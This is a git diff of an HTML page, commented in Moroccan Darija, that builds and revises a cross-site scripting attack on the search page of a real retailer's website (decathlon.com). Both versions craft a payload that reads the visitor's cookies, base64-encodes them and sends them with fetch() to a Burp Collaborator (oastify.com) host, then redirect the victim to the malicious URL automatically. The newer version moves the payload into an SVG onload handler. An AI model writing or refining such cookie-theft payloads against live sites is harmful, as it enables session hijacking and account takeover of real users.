@@ -4,17 +4,16 @@
     <script>
         function launchAttack() {
             // الرابط ديالك فـ Burp Collaborator
-            var collab = "f1h0y98sgnhzq0c3led3bax2vt1kplda.oastify.com";
-            
-            // الـ Payload اللي غايتنفذ وسط ديكاثلون (مشر بالـ Base64 باش ما يتكشفش)
-            // هاد الكود كيهز الكوكيز ويصيفطهم لـ Burp
-            var payload = "fetch('https://" + collab + "/?exfil=' + btoa(document.cookie))";
-            
-            // الرابط الملعون ديال Decathlon مع الـ XSS اللي لقيتي
-            // استعملنا </h1></title> باش نهربو من السجن ديال الكود
-            var targetUrl = "https://www.decathlon.com/search?q=%3C/title%3E%3Cscript%3Ealert(document.domain)%3C/script%3E" + payload + "<\/script>";
+            var collab = "187m5vfen9olxmjps0kpiw4o2f86w8kx.oastify.com";
 
-            // توجيه الضحية للرابط أوتوماتيكياً
+            // الكود اللي غايتنفذ وسط الـ SVG
+            // كيهز الكوكيز ويصيفطهم لـ Burp بلا ما يعيق الحد
+            var payload = "fetch('https://" + collab + "/?exfil=' + btoa(document.cookie))";
+
+            // الرابط اللي عطيتيني مع الـ Payload المطور
+            var targetUrl = "https://www.decathlon.com/search?q=test#<svg/onload=\"" + payload + "\">";
+
+            // توجيه الضحية أوتوماتيكياً
             window.location.href = targetUrl;
         }
     </script>
